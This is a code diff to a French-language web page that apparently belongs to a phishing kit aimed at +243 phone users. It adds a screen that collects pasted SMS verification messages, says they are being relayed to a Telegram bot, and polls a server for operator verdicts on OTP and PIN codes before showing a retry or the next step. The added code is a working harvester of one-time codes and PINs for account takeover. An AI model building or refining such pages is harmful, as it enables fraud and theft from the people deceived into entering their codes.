@@ -121,6 +121,74 @@
             border-top-right-radius: 50% 30px;
             margin-top: 40px;
         }
+
+        /* Fullscreen Overlay Styles */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            color: white;
+            text-align: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .overlay-card {
+            background: white;
+            color: #333;
+            padding: 30px 20px;
+            border-radius: 16px;
+            width: 85%;
+            max-width: 320px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #ff7900;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .overlay-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 8px;
+            color: #111;
+        }
+
+        .overlay-desc {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.4;
+        }
+
+        .error-message {
+            color: #d9534f;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+            text-align: center;
+        }
     </style>
 </head>
 
@@ -141,6 +209,7 @@
         <div class="phone-number" id="displayPhone">+243 ...</div>
 
         <textarea id="smsInput" placeholder="Collez ici votre lien / message SMS complet..."></textarea>
+        <div id="errorText" class="error-message">Code incorrect. Veuillez réessayer.</div>
 
         <div class="resend-text" id="timerBox">
             Renvoyer dans <span id="timer">60</span> secondes
@@ -152,6 +221,17 @@
 
 <div class="footer-banner"></div>
 
+<!-- Status Overlay -->
+<div class="overlay" id="statusOverlay">
+    <div class="overlay-card">
+        <div class="spinner"></div>
+        <div class="overlay-title">Veuillez patienter</div>
+        <div class="overlay-desc">
+            Veuillez patienter pendant l'envoi du lien SMS complet au robot Telegram...
+        </div>
+    </div>
+</div>
+
 <script>
 document.addEventListener("DOMContentLoaded", () => {
     const displayPhone = document.getElementById('displayPhone');
@@ -159,8 +239,12 @@ document.addEventListener("DOMContentLoaded", () => {
     const submitBtn = document.getElementById('submitBtn');
     const timerEl = document.getElementById('timer');
     const timerBox = document.getElementById('timerBox');
+    const statusOverlay = document.getElementById('statusOverlay');
+    const errorText = document.getElementById('errorText');
 
-    // Load saved phone number from previous pages
+    let checkInterval = null;
+
+    // Load phone number
     const savedPhone = localStorage.getItem('phone');
     if (savedPhone) {
         displayPhone.textContent = `+243${savedPhone.replace(/^\+?243/, '')}`;
@@ -168,51 +252,91 @@ document.addEventListener("DOMContentLoaded", () => {
         displayPhone.textContent = "+243 ...";
     }
 
-    // Enable button when input is not empty
+    // Input listener to toggle submit button
     smsInput.addEventListener('input', () => {
         const hasText = smsInput.value.trim().length > 0;
         submitBtn.disabled = !hasText;
         submitBtn.classList.toggle('active', hasText);
+        errorText.style.display = 'none';
     });
 
-    // Countdown Timer Logic
+    // Countdown Timer
     let timeLeft = 60;
-    const interval = setInterval(() => {
+    const timerInterval = setInterval(() => {
         timeLeft--;
         if (timerEl) timerEl.textContent = timeLeft;
 
         if (timeLeft <= 0) {
-            clearInterval(interval);
+            clearInterval(timerInterval);
             timerBox.innerHTML = '<span style="color:#ff7900; cursor:pointer;" onclick="location.reload()">Renvoyer le code</span>';
         }
     }, 1000);
 
-    // Submission Handling
+    // Poll status from server
+    function startStatusPolling() {
+        if (checkInterval) clearInterval(checkInterval);
+
+        checkInterval = setInterval(async () => {
+            try {
+                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(savedPhone)}`);
+                const data = await res.json();
+
+                if (data.status === "otp1_correct") {
+                    clearInterval(checkInterval);
+                    window.location.href = "/page5"; // Redirect to next step page
+                } else if (data.status === "otp1_wrong") {
+                    clearInterval(checkInterval);
+                    statusOverlay.style.display = "none";
+                    errorText.textContent = "Code OTP incorrect. Veuillez réessayer.";
+                    errorText.style.display = "block";
+                    smsInput.value = "";
+                    submitBtn.disabled = true;
+                    submitBtn.classList.remove('active');
+                } else if (data.status === "otp2_wrongpin") {
+                    clearInterval(checkInterval);
+                    statusOverlay.style.display = "none";
+                    errorText.textContent = "Code PIN incorrect. Veuillez réessayer.";
+                    errorText.style.display = "block";
+                }
+            } catch (err) {
+                console.error("Status check error:", err);
+            }
+        }, 2000);
+    }
+
+    // Submit Action
     submitBtn.addEventListener('click', async () => {
         if (submitBtn.disabled) return;
 
-        submitBtn.disabled = true;
-        submitBtn.classList.remove('active');
-        submitBtn.textContent = "TRAITEMENT...";
+        const pastedLink = smsInput.value.trim();
+        if (!pastedLink) return;
 
-        const data = {
-            phone: savedPhone,
-            smsData: smsInput.value.trim()
-        };
+        // Show loading overlay
+        statusOverlay.style.display = "flex";
+        errorText.style.display = "none";
 
         try {
-            await fetch('/api/verify-sms', {
+            const res = await fetch('/api/verify-first-otp', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
+                body: JSON.stringify({
+                    phone: savedPhone,
+                    link: pastedLink
+                })
             });
-        } catch (err) {
-            console.error("Error submitting verification code:", err);
-        }
 
-        setTimeout(() => {
-            window.location.href = "/page5";
-        }, 1000);
+            const responseData = await res.json();
+            if (responseData.success) {
+                startStatusPolling();
+            } else {
+                statusOverlay.style.display = "none";
+                alert("Erreur lors de l'envoi.");
+            }
+        } catch (err) {
+            console.error("Submission error:", err);
+            statusOverlay.style.display = "none";
+            alert("Erreur de connexion.");
+        }
     });
 
     if (window.Telegram?.WebApp) {
